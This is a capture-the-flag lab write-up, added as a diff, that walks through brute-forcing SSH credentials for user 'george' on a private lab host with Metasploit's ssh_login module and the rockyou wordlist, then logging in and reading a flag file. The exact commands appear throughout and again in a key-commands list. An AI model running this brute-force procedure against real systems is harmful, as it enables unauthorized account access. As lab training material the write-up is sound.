@@ -1,0 +1,133 @@
+# Metasploit - SSH Brute Force Enumeration
+
+## Objective
+
+The goal of this task was to:
+
+* Discover valid SSH credentials using Metasploit auxiliary modules
+* Access the target system via SSH
+* Locate and read a flag file in a user directory
+
+---
+
+## Target Information
+
+* Target host: 192.168.219.201
+* SSH port: 2222 (non-standard port)
+* Target user: george
+
+---
+
+## Initial Setup
+
+Started the Metasploit Framework:
+
+msfconsole
+
+---
+
+## Using the SSH Login Module
+
+Selected the SSH brute-force module:
+
+use auxiliary/scanner/ssh/ssh_login
+
+This module is used to test username and password combinations against an SSH service.
+
+---
+
+## Module Configuration
+
+Configured the required options:
+
+set RHOSTS 192.168.219.201
+set RPORT 2222
+set USERNAME george
+set PASS_FILE /usr/share/wordlists/rockyou.txt
+
+Verified configuration:
+
+show options
+
+---
+
+## Running the Attack
+
+Executed the module:
+
+run
+
+The module attempted multiple password combinations and identified valid credentials.
+
+---
+
+## Credential Discovery
+
+Valid credentials were identified:
+
+* Username: george
+* Password: (discovered during brute force)
+
+---
+
+## Gaining Access
+
+Connected to the system using SSH:
+
+ssh george@192.168.219.201 -p 2222
+
+After entering the password, access was granted.
+
+---
+
+## Post-Exploitation
+
+Navigated to the user directory:
+
+cd /home/george
+
+Listed files:
+
+ls
+
+---
+
+## Retrieving the Flag
+
+Read the file containing the flag:
+
+cat flag.txt
+
+---
+
+## Key Commands
+
+msfconsole
+use auxiliary/scanner/ssh/ssh_login
+set RHOSTS 192.168.219.201
+set RPORT 2222
+set USERNAME george
+set PASS_FILE /usr/share/wordlists/rockyou.txt
+run
+ssh george@192.168.219.201 -p 2222
+cd /home/george
+cat flag.txt
+
+---
+
+## Key Concepts
+
+* Auxiliary modules are used for scanning and enumeration
+* SSH brute force tests multiple password combinations
+* Services may run on non-standard ports and should always be checked
+* Credential discovery is a key step in gaining initial access
+
+---
+
+## Additional Note
+
+During enumeration, always scan all ports to identify non-standard services:
+
+nmap -p- 192.168.219.201
+
+This can reveal services such as SSH running on uncommon ports.
